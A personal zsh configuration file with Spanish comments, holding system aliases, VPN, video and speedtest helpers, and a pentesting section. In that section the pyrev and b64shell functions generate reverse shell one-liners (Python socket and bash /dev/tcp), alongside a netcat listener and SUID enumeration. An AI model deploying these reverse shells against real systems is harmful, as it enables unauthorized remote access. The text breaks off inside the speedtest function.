#!/bin/zsh
# -*- coding: utf-8 -*-

# --- Protección Anti-Bash ---
# Detener si no se ejecuta con Zsh para evitar errores de sintaxis.
if [ -z "$ZSH_VERSION" ]; then
    return 1
fi

# --- Exportación de PATH Crítico ---
# Debe estar al principio para asegurar que los comandos estén disponibles.

# Medir tiempo de carga (descomentar para depurar)
# zmodload zsh/zprof

# Configuración de Powerlevel10k (inicio rápido)
if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]; then
  source "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh"
fi
typeset -g POWERLEVEL9K_INSTANT_PROMPT=quiet

# Configuración básica
export _JAVA_AWT_WM_NONREPARENTING=1
export LC_ALL=en_US.UTF-8
export EDITOR=nano
export DXVK_ASYNC=1
export DXVK_STATE_CACHE=1
export VISUAL=nano

# Definición de PATH simplificada
export PATH="$HOME/bin:$HOME/.local/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/games:/usr/games:/usr/share/games:/snap/bin:/usr/sandbox:$PATH"

# Historial (mejorado)
HISTSIZE=50000
SAVEHIST=50000
HISTFILE=~/.zsh_history
setopt histignorealldups sharehistory
setopt hist_ignore_space      # Ignora comandos que empiezan con espacio
setopt hist_reduce_blanks     # Elimina espacios extra

# Keybindings
bindkey -e                    # Modo emacs
bindkey "^[[H" beginning-of-line
bindkey "^[[F" end-of-line
bindkey "^[[3~" delete-char
bindkey "^[[1;3C" forward-word
bindkey "^[[1;3D" backward-word

# Autocompletado (optimizado)
autoload -Uz compinit
if [[ -n ${ZDOTDIR}/.zcompdump(#qN.mh+24) ]]; then
  compinit
else
  compinit -C
fi

# Aceleración del autocompletado
zstyle ':completion:*' use-cache on
zstyle ':completion:*' cache-path ~/.zsh/cache
zstyle ':completion:*' auto-description 'Especifica: %d'
zstyle ':completion:*' completer _expand _complete _correct _approximate
zstyle ':completion:*' format 'Completando %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' menu select=2
eval "$(dircolors -b)"
zstyle ':completion:*:default' list-colors ${(s.:.)LS_COLORS}
zstyle ':completion:*' list-colors ''
zstyle ':completion:*' list-prompt %SAt %p: Presiona TAB para más, o el carácter a insertar%s
zstyle ':completion:*' matcher-list '' 'm:{a-z}={A-Z}' 'm:{a-zA-Z}={A-Za-z}' 'r:|[._-]=* r:|=* l:|=*'
zstyle ':completion:*' select-prompt %SScrolling active: selección actual en %p%s
zstyle ':completion:*' use-compctl false
zstyle ':completion:*' verbose true
zstyle ':completion:*:*:kill:*:processes' list-colors '=(#b) #([0-9]#)*=0=01;31'
zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'

# Definición de colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
PINK='\033[1;35m'
BRIGHT_CYAN='\033[1;36m'
ORANGE='\033[38;5;208m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# ---------- ALIAS ----------

# Alias para listado y visualización
alias ll='lsd -lh --group-dirs=first --date "+%d/%m/%Y %H:%M"'
alias la='lsd -a --group-dirs=first --date "+%d/%m/%Y %H:%M"'
alias l='lsd --group-dirs=first --date "+%d/%m/%Y %H:%M"'
alias lla='lsd -lha --group-dirs=first --date "+%d/%m/%Y %H:%M"'
alias ls='lsd --group-dirs=first --date "+%d/%m/%Y %H:%M"'
alias lsl='lsd -la --reverse --inode --date "+%d/%m/%Y %H:%M"'
alias cat='bat --paging=never'
alias catn='bat'
alias catnl='cat'
alias orphans='[[ -n $(pacman -Qdt) ]] && sudo pacman -Rs $(pacman -Qdtq) && paru -Yc || echo "no orphans to remove"'
alias reflector-update="sudo reflector --latest 20 --country Chile,US --protocol https --sort rate --save /etc/pacman.d/mirrorlist"

# Alias especiales
alias HOME='cd $HOME'
alias snapshot="sudo snapper -c root list"

# Alias útiles
alias show_rules='sudo nft list ruleset'
alias nmapEnum='nmap -sC -sV -oA nmap_enum'
alias msf='msfconsole -q'
alias wireshark='sudo wireshark'
alias myip='echo -e "\033[1;36m$(curl -s ifconfig.me)\033[0m"'
alias scan_ports='sudo nmap -sS -O'
alias active_connections='ss -tuln'
alias check_auth_log='sudo tail -f /var/log/auth.log'
alias ytb="mpv --ytdl-format='bestvideo+bestaudio/best' --fs"
alias cvpn='check_vpn'
alias kvpn='kill_vpn'

# Alias para actualizar el sistema
alias update-system='echo -e "${BOLD}${BLUE}[*] Actualizando sistema...${NC}" &&
sudo pacman -Syyu --noconfirm &&
echo -e "\n${BOLD}${BLUE}[*] Actualizando paquetes AUR...${NC}" &&
paru -Sua --noconfirm &&
echo -e "\n${BOLD}${BLUE}[*] Limpiando caché de paquetes...${NC}" &&
paru -Sc --noconfirm &&
orphans &&
echo -e "\n${BOLD}${GREEN}[✓] Sistema actualizado y limpio${NC}"'

# Alias de nano
alias n='nano'                     # Uso rápido
alias ns='sudo nano'               # Nano como sudo
alias nk='TERM=xterm-256color nano' # Nano compatible con Kitty
alias nr='TERM=xterm nano'         # Nano para sesiones remotas
alias nanoc='nano --colors=always'    # Nano con colores forzados


# Alias para la tabla de IPs (optimizado)
alias IPS='echo -e "\n\033[1;34m╔════════════════════╦════════════════════╗\033[0m";
echo -e "\033[1;34m║\033[0m \033[1;37mINTERFAZ          \033[0m \033[1;34m║\033[0m \033[1;37mDIRECCIÓN IP      \033[0m \033[1;34m║\033[0m";
echo -e "\033[1;34m╠════════════════════╬════════════════════╣\033[0m";
ip -o addr show | grep -v inet6 | awk '"'"'{print $2, $4}'"'"' | cut -d/ -f1 | grep -v '"'"'lo'"'"' | sort | while read interface ip; do
    printf "\033[1;34m║\033[0m \033[0;36m%-18s\033[0m \033[1;34m║\033[0m \033[0;32m%-18s\033[0m \033[1;34m║\033[0m\n" "$interface" "$ip";
done;
echo -e "\033[1;34m╚════════════════════╩════════════════════╝\033[0m\n"'

# ---------- FUNCIONES ----------


# Función para verificar VPNs activas
check_vpn() {
    echo -e "${BOLD}${BLUE}=== Verificando conexiones VPN activas ===${NC}\n"
    local vpns_encontradas=0

    # Verificar OpenVPN
    if pgrep -x "openvpn" > /dev/null; then
        echo -e "${BOLD}[1]${NC} ${GREEN}OpenVPN está activo${NC}"
        echo -e "    ${CYAN}PID:${NC} $(pgrep -x 'openvpn')"
        vpns_encontradas=1
    fi

    # Verificar WireGuard
    if ip link show | grep -q "wg"; then
        echo -e "${BOLD}[2]${NC} ${GREEN}WireGuard está activo${NC}"
        echo -e "    ${CYAN}Interfaces:${NC} $(ip link show | grep "wg" | cut -d: -f2)"
        vpns_encontradas=1
    fi

    # Verificar Tailscale
    if ip link show | grep -q "tailscale0"; then
        echo -e "${BOLD}[3]${NC} ${GREEN}Tailscale está activo${NC}"
        echo -e "    ${CYAN}Estado:${NC}"
        tailscale status | sed 's/^/    /'
        echo -e "    ${CYAN}IP:${NC} $(ip addr show tailscale0 | grep inet | awk '{print $2}')"
        vpns_encontradas=1
    fi

    # Verificar otras VPNs
    if ip link show | grep -qE "tun|tap"; then
        echo -e "${BOLD}[4]${NC} ${GREEN}Otras interfaces VPN detectadas:${NC}"
        ip link show | grep -E "tun|tap" | sed 's/^/    /'
        vpns_encontradas=1
    fi

    if [ $vpns_encontradas -eq 0 ]; then
        echo -e "${YELLOW}No se encontraron VPNs activas${NC}"
    fi
}

# Función para matar VPNs selectivamente
kill_vpn() {
    clear
    echo -e "${BOLD}${BLUE}=== Gestor de conexiones VPN ===${NC}\n"
    check_vpn

    echo -e "\n${BOLD}${BLUE}Opciones disponibles:${NC}"
    echo -e "${BOLD}[1]${NC} ${CYAN}Matar OpenVPN${NC}"
    echo -e "${BOLD}[2]${NC} ${CYAN}Matar WireGuard${NC}"
    echo -e "${BOLD}[3]${NC} ${CYAN}Matar Tailscale${NC}"
    echo -e "${BOLD}[4]${NC} ${CYAN}Matar otras VPNs${NC}"
    echo -e "${BOLD}[5]${NC} ${RED}Matar TODAS las VPNs${NC}"
    echo -e "${BOLD}[0]${NC} ${YELLOW}Cancelar${NC}"

    echo -n -e "\n${BOLD}¿Qué VPN quieres terminar? (0-5):${NC} "
    read opcion

    case $opcion in
        1)
            if pgrep -x "openvpn" > /dev/null; then
                echo -e "\n${YELLOW}Matando OpenVPN...${NC}"
                sudo killall openvpn && echo -e "${GREEN}✓ OpenVPN terminado${NC}"
            else
                echo -e "\n${RED}OpenVPN no está activo${NC}"
            fi
            ;;
        2)
            if ip link show | grep -q "wg"; then
                echo -e "\n${YELLOW}Desactivando interfaces WireGuard...${NC}"
                for interface in $(ip link show | grep "wg" | cut -d: -f2); do
                    sudo wg-quick down ${interface// /} && echo -e "${GREEN}✓ Interface ${interface} desactivada${NC}"
                done
            else
                echo -e "\n${RED}WireGuard no está activo${NC}"
            fi
            ;;
        3)
            if ip link show | grep -q "tailscale0"; then
                echo -e "\n${YELLOW}Desactivando Tailscale...${NC}"
                sudo systemctl stop tailscaled && echo -e "${GREEN}✓ Tailscale detenido${NC}"
            else
                echo -e "\n${RED}Tailscale no está activo${NC}"
            fi
            ;;
        4)
            if ip link show | grep -qE "tun|tap"; then
                echo -e "\n${YELLOW}Eliminando otras interfaces VPN...${NC}"
                for interface in $(ip link show | grep -E "tun|tap" | cut -d: -f2); do
                    sudo ip link delete ${interface// /} && echo -e "${GREEN}✓ Interface ${interface} eliminada${NC}"
                done
            else
                echo -e "\n${RED}No se encontraron otras interfaces VPN${NC}"
            fi
            ;;
        5)
            echo -e "\n${RED}¡Atención! Matando todas las VPNs...${NC}"
            # OpenVPN
            sudo killall openvpn 2>/dev/null && echo -e "${GREEN}✓ OpenVPN terminado${NC}"

            # WireGuard
            for interface in $(ip link show | grep "wg" | cut -d: -f2); do
                sudo wg-quick down ${interface// /} 2>/dev/null && echo -e "${GREEN}✓ WireGuard ${interface} desactivado${NC}"
            done

            # Tailscale
            sudo systemctl stop tailscaled 2>/dev/null && echo -e "${GREEN}✓ Tailscale detenido${NC}"

            # Otras interfaces
            for interface in $(ip link show | grep -E "tun|tap" | cut -d: -f2); do
                sudo ip link delete ${interface// /} 2>/dev/null && echo -e "${GREEN}✓ Interface ${interface} eliminada${NC}"
            done
            ;;
        0)
            echo -e "\n${YELLOW}Operación cancelada${NC}"
            return
            ;;
        *)
            echo -e "\n${RED}Opción inválida${NC}"
            return
            ;;
    esac

    echo -e "\n${BOLD}${BLUE}Estado final:${NC}"
    check_vpn
}


# apagar Monitores

monitor_sleep() {
  # Para X11
  if [ "$XDG_SESSION_TYPE" = "x11" ]; then
    if command -v xset >/dev/null 2>&1; then
      export DISPLAY=:0
      xset dpms force off
      echo "Monitores apagados (X11)."
    else
      echo "xset no instalado, no se puede apagar monitores."
    fi

  # Para Wayland
  elif [ "$XDG_SESSION_TYPE" = "wayland" ]; then
    # Intento usar loginctl
    if command -v loginctl >/dev/null 2>&1; then
      loginctl lock-session
      echo "Pantalla bloqueada y apagada (Wayland)."
    else
      echo "No se puede apagar pantalla en Wayland."
    fi
  else
    echo "Tipo de sesión desconocido: $XDG_SESSION_TYPE"
  fi
}

# ---------- FUNCIONES DE SEGURIDAD ----------

# Crea estructura de directorios para pentesting
mkt(){
    mkdir {nmap,content,exploits,scripts}
}

# Extrae puertos abiertos de un escaneo Nmap (MEJORADO)
extractPorts(){
    if [[ ! -f "$1" ]]; then
        echo -e "${RED}Error: Archivo no encontrado${NC}"
        echo -e "Uso: ${CYAN}extractPorts <archivo.gnmap>${NC}"
        return 1
    fi

    local ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
    local ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"

    if [[ -z "$ports" ]]; then
        echo -e "${RED}Error: No se encontraron puertos abiertos en el archivo${NC}"
        return 1
    fi

    # Tabla con información extraída
    echo -e "\n${BLUE}╔════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC} ${BOLD}${YELLOW}EXTRACCIÓN DE PUERTOS${NC}                     ${BLUE}║${NC}"
    echo -e "${BLUE}╠═══════════════════╦════════════════════════╣${NC}"
    echo -e "${BLUE}║${NC} ${BOLD}Dirección IP${NC}     ${BLUE}║${NC} ${GREEN}$ip_address${NC}           ${BLUE}║${NC}"
    echo -e "${BLUE}╠═══════════════════╬════════════════════════╣${NC}"
    echo -e "${BLUE}║${NC} ${BOLD}Puertos abiertos${NC} ${BLUE}║${NC} ${GREEN}$ports${NC} ${BLUE}║${NC}"
    echo -e "${BLUE}╚═══════════════════╩════════════════════════╝${NC}"

    # Copiar al portapapeles
    echo $ports | tr -d '\n' | xclip -sel clip
    echo -e "\n${CYAN}[✓] Puertos copiados al portapapeles${NC}\n"

    # Sugerencias para el siguiente paso
    echo -e "${YELLOW}Comando para escaneo detallado:${NC}"
    echo -e "${GREEN}nmap -sCV -p$ports $ip_address -oN targeted.nmap${NC}\n"
}

# Función para SSH
sshfix() {
    if [[ $# -eq 0 ]]; then
        echo "Usage: sshfix <ip_or_hostname> [username]"
        return 1
    fi
    local host="$1"
    local user="${2:-$USER}"
    ssh-keygen -f "${HOME}/.ssh/known_hosts" -R "$host"
    ssh -o StrictHostKeyChecking=accept-new "${user}@${host}"
}

# Genera reverse shell en Python
pyrev() {
    local ip=${1:-$(ip route get 1 | awk '{print $7;exit}')}
    local port=${2:-4444}
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
}

# Inicia servidor web rápido
webserver() {
    local port=${1:-8000}
    python -m http.server $port
}

# Busca exploits con colores
searchexploit() {
    command searchsploit "$@" | tee >(grep -P "^Exploit" | sed "s/^/\x1b[1;31m/") >(grep -P "^Shellcode" | sed "s/^/\x1b[1;33m/") >(grep -P "^Paper" | sed "s/^/\x1b[1;36m/")
}

# Genera wordlist desde una URL
genwordlist() {
    local url=$1
    local output=${2:-wordlist.txt}
    cewl -d 2 -m 5 -w $output $url
    echo "Wordlist generada en $output"
}

# Realiza escaneo con nikto
nikto_scan() {
    local target=$1
    nikto -h $target -output nikto_$target.txt
}

# Encripta/desencripta con GPG
crypto() {
    if [[ $1 == "encrypt" ]]; then
        gpg -c $2
    elif [[ $1 == "decrypt" ]]; then
        gpg -d $2
    else
        echo "Uso: crypto [encrypt|decrypt] archivo"
    fi
}


# Escanea hosts en una subred
pingsweep() {
    local subnet="$1"
    if [[ -z "$subnet" ]]; then
        echo -e "\033[1;31mError: Debes especificar una subred. Ejemplo: pingsweep 192.168.1.0/24\033[0m"
        return 1
    fi

    local temp_file=$(mktemp)

    # Banner simple
    echo -e "\n\033[1;34m╔══════════════════════════════════════════════╗\033[0m"
    echo -e "\033[1;34m║\033[0m \033[1;33mEscaneando subred:\033[0m \033[1;36m$subnet\033[0m \033[1;34m          ║\033[0m"
    echo -e "\033[1;34m╚══════════════════════════════════════════════╝\033[0m"

    echo -e "\033[0;33m⏳ Escaneando red, espere por favor...\033[0m"

    # Ejecuta nmap y guarda la salida en un archivo temporal
    nmap -sn "$subnet" -oG "$temp_file" > /dev/null

    # Extrae y cuenta los hosts activos
    local total_hosts=$(grep "Status: Up" "$temp_file" | wc -l)

    # Crear tabla con columnas más amplias
    echo -e "\n\033[1;34m╔═══════════════════╦════════════════════════════════════════╗\033[0m"
    echo -e "\033[1;34m║\033[0m \033[1;37mIP               \033[0m \033[1;34m║\033[0m \033[1;37mHOSTNAME                              \033[0m \033[1;34m║\033[0m"
    echo -e "\033[1;34m╠═══════════════════╬════════════════════════════════════════╣\033[0m"

    # Si no hay hosts, mostrar mensaje
    if [ $total_hosts -eq 0 ]; then
        echo -e "\033[1;34m║\033[0m \033[0;33mNo se encontraron hosts activos en la red           \033[0m \033[1;34m║\033[0m"
    else
        # Procesar hosts encontrados
        grep "Status: Up" "$temp_file" | while read line; do
            local ip=$(echo "$line" | awk '{print $2}')
            local hostname=$(echo "$line" | awk -F'[()]' '{print $2}')

            if [[ -z "$hostname" || "$hostname" == "$ip" ]]; then
                hostname="No hostname"
            fi

            printf "\033[1;34m║\033[0m \033[0;36m%-17s\033[0m \033[1;34m║\033[0m \033[0;32m%-38s\033[0m \033[1;34m║\033[0m\n" "$ip" "$hostname"
        done
    fi

    echo -e "\033[1;34m╚═══════════════════╩════════════════════════════════════════╝\033[0m"

    # Resumen FUERA del recuadro
    echo -e "\n\033[1;33m📊 Resumen:\033[0m \033[0;32m$total_hosts\033[0m hosts activos en \033[0;36m$subnet\033[0m\n"

    # Eliminar archivo temporal
    rm -f "$temp_file"
}

# Convierte hexadecimal a ASCII
hex2ascii() {
    echo "$1" | xxd -r -p
}

# Convierte ASCII a hexadecimal
ascii2hex() {
    echo -n "$1" | od -A n -t x1
}

# Busca binarios con SUID (MEJORADO)
find_suid() {
    echo -e "\n${BOLD}${BLUE}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${BLUE}║${NC} ${YELLOW}Buscando binarios SUID...${NC} ${BLUE}                            ║${NC}"
    echo -e "${BOLD}${BLUE}╚══════════════════════════════════════════════════════════╝${NC}\n"

    echo -e "${CYAN}⏳ Este proceso puede tardar un momento...${NC}\n"

    local tmp_file=$(mktemp)
    sudo find / -type f -perm -4000 2>/dev/null | sort > "$tmp_file"

    if [[ ! -s "$tmp_file" ]]; then
        echo -e "${RED}No se encontraron binarios SUID${NC}"
        rm "$tmp_file"
        return
    fi

    echo -e "${BOLD}${BLUE}╔═════════════════════════════════╦═══════════════╦═════════════╗${NC}"
    echo -e "${BOLD}${BLUE}║${NC} ${BOLD}Ruta del Binario${NC}                ${BOLD}${BLUE}║${NC} ${BOLD}Propietario${NC}     ${BOLD}${BLUE}║${NC} ${BOLD}Tamaño${NC}      ${BOLD}${BLUE}║${NC}"
    echo -e "${BOLD}${BLUE}╠═════════════════════════════════╬═══════════════╬═════════════╣${NC}"

    # Recorremos cada binario SUID
    while read -r binary; do
        # Obtiene propietario y tamaño
        local owner=$(stat -c '%U' "$binary" 2>/dev/null)
        local size=$(stat -c '%s' "$binary" 2>/dev/null | numfmt --to=iec)

        # Resalta en rojo binarios que no pertenecen a root (potenciales vulnerabilidades)
        if [[ "$owner" != "root" ]]; then
            owner="${RED}${owner}${NC}"
        fi

        # Muestra información en tabla
        printf "${BOLD}${BLUE}║${NC} ${GREEN}%-33s${BOLD}${BLUE}║${NC} %-15s${BOLD}${BLUE}║${NC} %-13s${BOLD}${BLUE}║${NC}\n" \
            "$binary" "$owner" "$size"
    done < "$tmp_file"

    echo -e "${BOLD}${BLUE}╚═════════════════════════════════╩═══════════════╩═════════════╝${NC}"

    local total=$(wc -l < "$tmp_file")
    echo -e "\n${YELLOW}Total: ${total} binarios SUID encontrados${NC}"
    echo -e "${CYAN}ℹ️ Binarios con propietario distinto a root pueden indicar potenciales vulnerabilidades${NC}\n"

    rm "$tmp_file"
}

# Genera reverse shell codificado en base64
b64shell() {
    local ip=${1:-$(ip route get 1 | awk '{print $7;exit}')}
    local port=${2:-4444}
    echo "bash -i >& /dev/tcp/$ip/$port 0>&1" | base64
}

# Inicia netcat en modo escucha
nclisten() {
    local port=${1:-4444}
    sudo nc -lvnp $port
}

# Descarga videos en alta calidad (MEJORADA)
bajavideo() {
    local url="$1"
    local output_dir="${2:-$HOME/Videos}"
    local quality="${3:-1080}"

    if [[ -z "$url" ]]; then
        echo -e "${RED}Error: Debes proporcionar una URL${NC}"
        echo -e "Uso: ${CYAN}bajavideo <url> [directorio_salida] [calidad]${NC}"
        echo -e "Ejemplo: ${CYAN}bajavideo https://www.youtube.com/watch?v=dQw4w9WgXcQ ~/Descargas 720${NC}"
        return 1
    fi

    # Crear directorio si no existe
    mkdir -p "$output_dir"

    # Banner informativo
    echo -e "\n${BLUE}╔════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC} ${YELLOW}DESCARGADOR DE VIDEOS${NC}                              ${BLUE}║${NC}"
    echo -e "${BLUE}╠════════════════════════════════════════════════════╣${NC}"
    echo -e "${BLUE}║${NC} URL: ${GREEN}$url${NC}"
    echo -e "${BLUE}║${NC} Directorio: ${GREEN}$output_dir${NC}"
    echo -e "${BLUE}║${NC} Calidad: ${GREEN}${quality}p${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════╝${NC}\n"

    echo -e "${CYAN}⏳ Obteniendo información del video...${NC}"

    # Obtiene título del video
    local title=$(yt-dlp --get-title "$url" 2>/dev/null)
    if [[ -n "$title" ]]; then
        echo -e "${GREEN}✓ Título: ${title}${NC}"
    fi

    # Iniciar descarga con feedback visual
    echo -e "\n${CYAN}📥 Descargando video...${NC}"

    yt-dlp -f "bestvideo[height<=${quality}]+bestaudio/best[height<=${quality}]" \
           --progress-template "download:%(progress._percent_str)s [%(progress._downloaded_bytes_str)s/%(progress._total_bytes_str)s] %(progress._speed_str)s ETA: %(progress._eta_str)s" \
           --remux-video mp4 \
           --newline \
           --no-warnings \
           -ciw \
           -o "$output_dir/%(uploader)s/%(title)s.%(ext)s" "$url"

    local exit_code=$?

    if [[ $exit_code -eq 0 ]]; then
        echo -e "\n${GREEN}🧹 Limpiando nombres de archivos...${NC}"
        find "$output_dir" -type f -name "*.mp4" -exec bash -c '
            for file; do
                mv "$file" "$(echo "$file" | sed -E "s/\.f[0-9]+//")"
            done
        ' _ {} +

        echo -e "\n${GREEN}✅ Descarga completa y archivos renombrados${NC}"
        echo -e "${CYAN}📂 Ubicación: ${output_dir}${NC}\n"
    else
        echo -e "\n${RED}❌ Error al descargar el video${NC}\n"
    fi
}

# Función de speedtest ULTRA MEJORADA - Estilo Speedtest.net
speedtest_mejorado() {
    # Verificar qué comando de speedtest está disponible
    # Estrategia: Usar speedtest-cli directamente ya que es lo que tienes instalado
    local speedtest_cmd=""
    local use_official=false

    # Verificar si speedtest-cli está disponible (preferencia)
    if command -v speedtest-cli &> /dev/null; then
        speedtest_cmd="speedtest-cli"
        use_official=false
    # Si no, intentar con speedtest genérico
    elif command -v speedtest &> /dev/null; then
        # Verificar si es Python o Ookla leyendo el archivo
        if head -1 "$(command -v speedtest)" 2>/dev/null | grep -q "python"; then
            # Es speedtest-cli de Python
            speedtest_cmd="speedtest"
            use_official=false
        else
            # Probablemente es el oficial de Ookla
            speedtest_cmd="speedtest"
            use_official=true
        fi
    else
        echo -e "${RED}Error: No se encontró speedtest instalado${NC}"
        echo -e "${CYAN}Instala con: ${GREEN}sudo pacman -S speedtest-cli${NC}"
        return 1
    fi

    # Banner inicial - Estilo Speedtest con degradado (57 caracteres de ancho)
    clear
    echo ""
    echo -e "${PINK}╔═════════════════════════════════════════════════════════╗${NC}"
    # Título centrado: emojis ocupan 2 espacios cada uno = 4 total, texto 37, total 41, espacios 16 (57-41)
    printf "${PINK}║${NC}        ${BOLD}${BRIGHT_CYAN}⚡ TEST DE VELOCIDAD DE INTERNET ULTRA ⚡${NC}         ${PINK}║${NC}\n"
    echo -e "${PINK}╚═════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Obtener información de red actual
    echo -e "${BRIGHT_CYAN}📡 Obteniendo información de red...${NC}"
    local interface=$(ip route | grep '^default' | awk '{print $5}' | head -n1)
    local local_ip=$(ip -o -4 addr show dev "$interface" 2>/dev/null | awk '{print $4}' | cut -d'/' -f1)
    local public_ip=$(curl -s --max-time 3 ifconfig.me || echo "No disponible")

    echo -e "${PURPLE}╔═════════════════╦═══════════════════════════════════╗${NC}"
    printf "${PURPLE}║${NC} %-15s ${PURPLE}║${NC} %-33s ${PURPLE}║${NC}\n" "Interfaz" "$interface"
    printf "${PURPLE}║${NC} %-15s ${PURPLE}║${NC} %-33s ${PURPLE}║${NC}\n" "IP Local" "$local_ip"
    printf "${PURPLE}║${NC} %-15s ${PURPLE}║${NC} %-33s ${PURPLE}║${NC}\n" "IP Pública" "$public_ip"
    echo -e "${PURPLE}╚═════════════════╩═══════════════════════════════════╝${NC}"
    echo ""

    echo -e "${BRIGHT_CYAN}⏳ Ejecutando prueba de velocidad...${NC}"
    echo -e "${YELLOW}   (Esto puede tardar 30-60 segundos)${NC}"
    echo ""

    # Crear archivo temporal para la salida
    local temp_file=$(mktemp)

    # Deshabilitar job control para evitar mensajes [1] 12345
    setopt local_options no_monitor no_notify

    # Ejecutar speedtest según el comando disponible (en background)
    if [[ "$use_official" == true ]]; then
        timeout 120 "$speedtest_cmd" --accept-license --accept-gdpr > "$temp_file" 2>&1 &
    else
        # Usar --secure puede evitar el error 403, si no funciona intentar sin --simple
        timeout 120 "$speedtest_cmd" --simple --secure > "$temp_file" 2>&1 &
    fi
    local test_pid=$!

    # Animación de carga que se actualiza en la misma línea con timeout
    local spin='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    local i=0
    local elapsed=0
    local max_wait=120  # 2 minutos máximo

    while kill -0 $test_pid 2>/dev/null; do
        i=$(( (i+1) % 10 ))
        elapsed=$((elapsed + 1))

        # Mostrar tiempo transcurrido cada 10 segundos
        if [[ $((elapsed % 10)) -eq 0 ]]; then
            printf "\r${BRIGHT_CYAN}   Midiendo velocidad ${spin:$i:1}${NC} (${elapsed}s)  "
        else
            printf "\r${BRIGHT_CYAN}   Midiendo velocidad ${spin:$i:1}${NC}        "
        fi

        sleep 0.1

        # Timeout manual por si acaso
        if [[ $((elapsed / 10)) -gt $max_wait ]]; then
            kill $test_pid 2>/dev/null
            printf "\r${RED}   ✗ Timeout: El test tardó demasiado${NC}                \n"
            echo ""
            echo -e "${YELLOW}Sugerencias:${NC}"
            echo -e "  ${CYAN}1.${NC} Verifica tu conexión a internet"
            echo -e "  ${CYAN}2.${NC} Intenta nuevamente en unos minutos"
            echo -e "  ${CYAN}3.${NC} Instala el speedtest oficial: ${GREEN}paru -S speedtest-cli${NC}"
            rm "$temp_file"
            return 1
        fi
    done

    # Esperar a que termine y obtener exit code
    wait $test_pid 2>/dev/null
    local exit_code=$?

    # Limpiar línea del spinner y mostrar éxito
    printf "\r${GREEN}   ✓ Medición completada!${NC}                    \n"
    echo ""

    # Si wait falló, verificar que el archivo tenga contenido válido
    if [[ ! -s "$temp_file" ]]; then
        exit_code=1
    elif grep -q "Ping:\|Download:\|Upload:" "$temp_file"; then
        # Tiene datos válidos, marcar como exitoso
        exit_code=0
    fi

    if [[ $exit_code -eq 124 ]] || [[ $exit_code -eq 137 ]]; then
        echo -e "${RED}Error: El test excedió el tiempo límite (timeout)${NC}"
        echo ""
        echo -e "${YELLOW}Sugerencias:${NC}"
        echo -e "  ${CYAN}1.${NC} Verifica tu conexión a internet"
        echo -e "  ${CYAN}2.${NC} Prueba con: ${GREEN}speedtest-cli --simple${NC} directamente"
        echo -e "  ${CYAN}3.${NC} Instala el speedtest oficial (más rápido): ${GREEN}paru -S speedtest-cli${NC}"
        rm "$temp_file"
        return 1
    fi

    if [[ $exit_code -ne 0 ]]; then
        echo -e "${RED}Error al ejecutar speedtest${NC}"
        if [[ -s "$temp_file" ]]; then
            echo ""
            local error_msg=$(cat "$temp_file")
            # Analizar el tipo de error
            if echo "$error_msg" | grep -q "403\|Forbidden"; then
                echo -e "${YELLOW}⚠ Error HTTP 403: El servidor de Speedtest bloqueó la solicitud${NC}"
                echo -e "${CYAN}Posibles causas:${NC}"
                echo -e "  • VPN activa (prueba: ${GREEN}kvpn${NC})"
                echo -e "  • Firewall bloqueando la conexión"
                echo -e "  • Demasiadas peticiones recientes"
            elif echo "$error_msg" | grep -q "Cannot retrieve\|configuration"; then
                echo -e "${YELLOW}⚠ No se pudo obtener la configuración del servidor${NC}"
                echo -e "${CYAN}Intenta: ${GREEN}speedtest-cli --secure${NC}"
            else
                echo -e "${YELLOW}Detalles:${NC}"
                echo "$error_msg" | head -5
            fi
        fi
        rm "$temp_file"
        echo ""
        return 1
    fi

    # Extraer valores según el comando usado
    if [[ "$use_official" == true ]]; then
        # Speedtest oficial de Ookla
        local server=$(grep "Server:" "$temp_file" | cut -d: -f2- | xargs)
        local isp=$(grep "ISP:" "$temp_file" | cut -d: -f2- | xargs)
        local ping=$(grep "Latency:" "$temp_file" | awk '{print $2}')
        local jitter=$(grep "Latency:" "$temp_file" | awk '{print $4}' | tr -d '()')
        local download=$(grep "Download:" "$temp_file" | awk '{print $2}')
        local upload=$(grep "Upload:" "$temp_file" | awk '{print $2}')
        local packet_loss=$(grep "Packet Loss:" "$temp_file" | awk '{print $3}' || echo "0")
        local result_url=$(grep "Result URL:" "$temp_file" | awk '{print $3}')
    else
        # speedtest-cli de Python con --simple
        local ping=$(grep "Ping:" "$temp_file" | awk '{print $2}')
        local download=$(grep "Download:" "$temp_file" | awk '{print $2}')
        local upload=$(grep "Upload:" "$temp_file" | awk '{print $2}')

        # Intentar obtener información real del servidor ejecutando speedtest-cli sin --simple
        # Usar el mismo test ya realizado si tiene la info, sino hacer uno nuevo
        local testing_line=$(grep "Testing from" "$temp_file" 2>/dev/null | head -1)
        local server_line=$(grep "Hosted by" "$temp_file" 2>/dev/null | head -1)

        # Si no está en el archivo (porque usamos --simple), ejecutar un test rápido
        if [[ -z "$testing_line" ]] || [[ -z "$server_line" ]]; then
            printf "\r${BRIGHT_CYAN}   Obteniendo información del servidor...${NC}             \n"
            local server_temp=$(mktemp)

            # Ejecutar speedtest sin --simple para obtener info detallada
            timeout 15 "$speedtest_cmd" --secure 2>&1 | head -10 > "$server_temp"

